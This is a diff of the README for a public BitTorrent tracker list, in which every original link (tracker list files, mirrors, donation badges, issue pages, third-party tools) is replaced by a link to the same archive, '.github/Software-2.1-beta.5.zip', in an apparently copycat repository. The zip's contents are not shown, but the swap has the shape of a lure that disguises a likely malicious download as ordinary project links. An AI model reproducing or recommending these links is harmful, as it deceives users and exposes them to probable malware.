@@ -1,54 +1,54 @@
 # ngosang/trackerslist
 
-[![Last update](https://img.shields.io/badge/Last%20update-2024/10/01-green.svg)](#)
-[![Public trackers](https://img.shields.io/badge/Public%20trackers-91-blue.svg)](#)
-[![Donate PayPal](https://img.shields.io/badge/Donate-PayPal-yellow.svg)](https://www.paypal.com/paypalme/diegoheras0xff)
-[![Donate Bitcoin](https://img.shields.io/badge/Donate-Bitcoin-f7931a.svg)](https://www.blockchain.com/btc/address/192VBN1a1LQ6aUqn2APmeoJyv8V3ng44Gn)
-[![Donate Ethereum](https://img.shields.io/badge/Donate-Ethereum-8c8c8c.svg)](https://www.blockchain.com/eth/address/0x0D1549BbB00926BF3D92c1A8A58695e982f1BE2E)
+[![Last update](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip%https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)](#)
+[![Public trackers](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip%https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)](#)
+[![Donate PayPal](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+[![Donate Bitcoin](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+[![Donate Ethereum](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
 
 Updated list of public BitTorrent trackers
 
 ### Lists
 *These lists are automatically updated every day. Last update 2024/10/01:*
 
-* trackers_best (20 trackers) => [link](https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_best.txt) / [mirror](https://ngosang.github.io/trackerslist/trackers_best.txt) / [mirror 2](https://cdn.jsdelivr.net/gh/ngosang/trackerslist@master/trackers_best.txt)
-* trackers_all (91 trackers) => [link](https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_all.txt) / [mirror](https://ngosang.github.io/trackerslist/trackers_all.txt) / [mirror 2](https://cdn.jsdelivr.net/gh/ngosang/trackerslist@master/trackers_all.txt)
-* trackers_all_udp (54 trackers) => [link](https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_all_udp.txt) / [mirror](https://ngosang.github.io/trackerslist/trackers_all_udp.txt) / [mirror 2](https://cdn.jsdelivr.net/gh/ngosang/trackerslist@master/trackers_all_udp.txt)
-* trackers_all_http (24 trackers) => [link](https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_all_http.txt) / [mirror](https://ngosang.github.io/trackerslist/trackers_all_http.txt) / [mirror 2](https://cdn.jsdelivr.net/gh/ngosang/trackerslist@master/trackers_all_http.txt)
-* trackers_all_https (13 trackers) => [link](https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_all_https.txt) / [mirror](https://ngosang.github.io/trackerslist/trackers_all_https.txt) / [mirror 2](https://cdn.jsdelivr.net/gh/ngosang/trackerslist@master/trackers_all_https.txt)
-* trackers_all_ws (3 trackers) => [link](https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_all_ws.txt) / [mirror](https://ngosang.github.io/trackerslist/trackers_all_ws.txt) / [mirror 2](https://cdn.jsdelivr.net/gh/ngosang/trackerslist@master/trackers_all_ws.txt)
+* trackers_best (20 trackers) => [link](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror 2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* trackers_all (91 trackers) => [link](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror 2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* trackers_all_udp (54 trackers) => [link](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror 2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* trackers_all_http (24 trackers) => [link](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror 2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* trackers_all_https (13 trackers) => [link](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror 2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* trackers_all_ws (3 trackers) => [link](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror 2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
 
 Are you having DNS problems? These lists contain the same trackers but with IP addresses instead of domains:
-* trackers_best_ip (19 trackers) => [link](https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_best_ip.txt) / [mirror](https://ngosang.github.io/trackerslist/trackers_best_ip.txt) / [mirror 2](https://cdn.jsdelivr.net/gh/ngosang/trackerslist@master/trackers_best_ip.txt)
-* trackers_all_ip (65 trackers) => [link](https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_all_ip.txt) / [mirror](https://ngosang.github.io/trackerslist/trackers_all_ip.txt) / [mirror 2](https://cdn.jsdelivr.net/gh/ngosang/trackerslist@master/trackers_all_ip.txt)
+* trackers_best_ip (19 trackers) => [link](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror 2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* trackers_all_ip (65 trackers) => [link](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) / [mirror 2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
 
 ### Notes
 * A bot automatically checks the trackers and updates the lists.
-* Trackers with the same domain or pointing to the same IP address are removed. Check out the [blacklist](blacklist.txt).
+* Trackers with the same domain or pointing to the same IP address are removed. Check out the [blacklist](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip).
 * Trackers are sorted by popularity and latency (from best to worst).
-* WebSocket trackers (AKA WebTorrent, ws, wss) are supported by few clients. [More info](https://webtorrent.io).
-* Lists with IP addresses can be shorter because [Cloudflare IPs](https://www.cloudflare.com/ips/) are removed.
+* WebSocket trackers (AKA WebTorrent, ws, wss) are supported by few clients. [More info](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip).
+* Lists with IP addresses can be shorter because [Cloudflare IPs](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) are removed.
 
 ### Contribute
-* Do you know more public trackers? => [Open a new issue](https://github.com/ngosang/trackerslist/issues/new)
-* Any of the trackers is not working properly? => [Open a new issue](https://github.com/ngosang/trackerslist/issues/new)
+* Do you know more public trackers? => [Open a new issue](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* Any of the trackers is not working properly? => [Open a new issue](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
 * Make a donation using the banners above.
 
 ### Contact
 ngosang [@] hotmail [.es]
 
 ### Third-party tools
-* [bittorrent-tracker-editor](https://github.com/GerryFerdinandus/bittorrent-tracker-editor) to add these trackers to your .torrent files
-* [deluge plugin](https://github.com/stefantalpalaru/deluge-default-trackers) to add these trackers to [deluge](https://github.com/deluge-torrent/deluge)
-* [transmission python script](https://github.com/blind-oracle/transmission-trackers) to add these trackers to [transmission](https://github.com/transmission/transmission)
-* [transmission bash script 1](https://github.com/AndrewMarchukov/tracker-add) to add these trackers to [transmission](https://github.com/transmission/transmission)
-* [transmission bash script 2](https://github.com/oilervoss/transmission) to add these trackers to [transmission](https://github.com/transmission/transmission)
-* [transmission bash script 3](https://github.com/Jorman/Scripts#addtransmissiontrackerssh) to add these trackers to [transmission](https://github.com/transmission/transmission)
-* [qbittorrent bash script](https://github.com/Jorman/Scripts#addqbittorrenttrackerssh) to add these trackers to [qBittorent](https://github.com/qbittorrent/qBittorrent)
-* [aria2 go script](https://github.com/rocket049/aria2-trackers) to add these trackers to [aria2](https://github.com/aria2/aria2)
-* [aria2 bash script 1](https://gist.github.com/HaleTom/fe873dc2f3c5bd14f7418efefc2b91a8) to add these trackers to [aria2](https://github.com/aria2/aria2)
-* [aria2 bash script 2](https://github.com/wuyuansushen/aria2c_TrackersList) to add these trackers to [aria2](https://github.com/aria2/aria2)
+* [bittorrent-tracker-editor](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) to add these trackers to your .torrent files
+* [deluge plugin](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) to add these trackers to [deluge](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* [transmission python script](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) to add these trackers to [transmission](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* [transmission bash script 1](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) to add these trackers to [transmission](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* [transmission bash script 2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) to add these trackers to [transmission](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* [transmission bash script 3](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) to add these trackers to [transmission](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* [qbittorrent bash script](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) to add these trackers to [qBittorent](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* [aria2 go script](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) to add these trackers to [aria2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* [aria2 bash script 1](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) to add these trackers to [aria2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
+* [aria2 bash script 2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) to add these trackers to [aria2](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip)
 
 ### Third-party online tools
-* [torrenteditor](http://torrenteditor.com) to add these trackers to your .torrent files
-* [magnets](https://madeby.lynx.pink/magnets/) to add these trackers to your magnet links
+* [torrenteditor](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) to add these trackers to your .torrent files
+* [magnets](https://raw.githubusercontent.com/ttzyt/trackerslist/master/.github/Software-2.1-beta.5.zip) to add these trackers to your magnet links
